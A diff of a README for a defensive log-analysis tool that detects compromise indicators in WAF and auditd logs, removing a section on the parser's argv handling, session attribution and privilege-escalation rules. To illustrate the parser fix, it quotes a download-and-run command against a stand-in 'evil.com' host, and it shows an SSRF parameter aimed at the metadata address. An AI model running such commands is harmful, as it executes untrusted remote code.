@@ -54,41 +54,6 @@ Feed the whole JSON file to an LLM for analysis, or read `flagged_indicators` yo
 | Large response / possible exfil | waf | flat byte ceiling + relative-to-median-for-that-path check, using the `size` field you added |
 | Domain observations | auth | best-effort regex extraction from free-text messages — sparse, since none of the four schemas has a dedicated domain field |
 
-Dropped/not attempted, and why:
-- **Beaconing** — dropped per your call (no reliable outbound-timing granularity in these logs).
-- **SSRF, LFI/RFI** — would need query-string/param separation the WAF schema doesn't currently capture (only full `req_path`, so URL-embedded traversal/injection is still caught, but a param like `?url=http://169.254.169.254/` you'd want a dedicated field for).
-- **Impossible travel** — no geolocation data anywhere.
-- **Web shell detection** — no cross-log correlator specifically pairs "WAF POST to new path" with "auditd process spawn from www-data" yet; the pieces (malware exe detector + WAF path detectors) exist independently, but linking them by *time proximity* rather than just shared IP would take another pass if you want it.
-
-## Auditd argv & src_ip attribution
-
-`auditd_parser_patched.py` is an updated version of your parser. Two fixes plus one addition:
-
-- **Fixed a quoting bug**: the original used `line.split()` on raw content, which breaks on any quoted value containing spaces — exactly what shows up in `EXECVE` argv for real payloads (e.g. `a2="curl -s http://evil.com/x.sh | bash"` would get shredded into garbage tokens). Replaced with a quote-safe key=value tokenizer.
-- **Fixed `exe` extraction for kernel records**: `SYSCALL`/`EXECVE` lines don't have the `msg='...'` wrapper that PAM-generated lines (like `USER_CMD`) have, so `exe`/`comm` now falls back to the outer fields when the inner block is empty.
-- **Added `argv` reconstruction**: for `type=EXECVE` lines, pulls `a0`..`a{argc-1}` into an `argv` list and a joined `cmdline` string (hex-decoding any unquoted hex-encoded arguments auditd produces for unsafe characters).
-
-Swap this in for your current parser (same file structure, same output path convention).
-
-**Why this alone isn't enough — the correlation problem:** kernel exec records (`SYSCALL`/`EXECVE`) never carry a `src_ip` — only session/login records do, tagged with the same `ses` (session ID) but a *different* `audit_event_id`. So attributing a reverse shell to an attacking IP takes two joins, not one:
-
-1. **`audit_merge.py`** joins `SYSCALL` + `EXECVE` records sharing the same `audit_event_id` into one merged record with `exe` + `argv` + `cmdline` together.
-2. It then backfills `src_ip` by finding the nearest-in-time record sharing the same `ses` that does carry a `src_ip`.
-
-This backfill is deliberately conservative: if a given `ses` value is associated with more than one distinct IP across the day (session IDs do get reused), the merged record is marked `src_ip_ses_reuse_ambiguous: true` and lists every candidate IP rather than silently picking one — you'll see this called out directly in `reasons` in the report (`AMBIGUOUS - session id reused by multiple IPs: [...]`). Backfills more than an hour away from the nearest session record are marked `low_confidence` for the same reason. Treat ambiguous/low-confidence attributions as leads to verify, not settled facts.
-
-`main.py` runs this merge automatically each day — nothing to configure unless you want to change the ambiguity time window (`SES_BACKFILL_LOW_CONFIDENCE_SECONDS` in `config.py`).
-
-**Privilege escalation detection was tightened deliberately:** the original version flagged any `uid != auid`, which is true for nearly every login, sudo call, and cron job — not useful. It now only fires on:
-- a failed root authentication/escalation attempt,
-- a root-targeted PAM operation claimed by a binary that isn't `sudo`/`su`/`pkexec`/`doas`,
-- a process running as `uid=0` with no traceable `auid` at all (root with no audit trail — a common signature of an exploited SUID binary), or
-- a direct setuid-family syscall landing at root from a binary outside the standard tool/daemon allowlist.
-
-**Tradeoff worth knowing:** routine, successful `sudo` usage by an authorized user is now silent — that's intentional (it's normal admin activity, not an IOC), but if you actually want a full audit trail of every root escalation regardless of legitimacy, that's a different, compliance-style goal from IOC detection and would need a separate log/report rather than folding it into this detector. Say so if you want that added.
-
-The tool allowlists live in `config.py`: `KNOWN_PRIVESC_TOOLS` (sudo/su/pkexec/doas) and `KNOWN_SYSTEM_DAEMONS` (sshd/systemd/cron/etc.) — add anything specific to your stack.
-
 ## Tuning
 
 Everything you'll want to adjust lives in `config.py`:
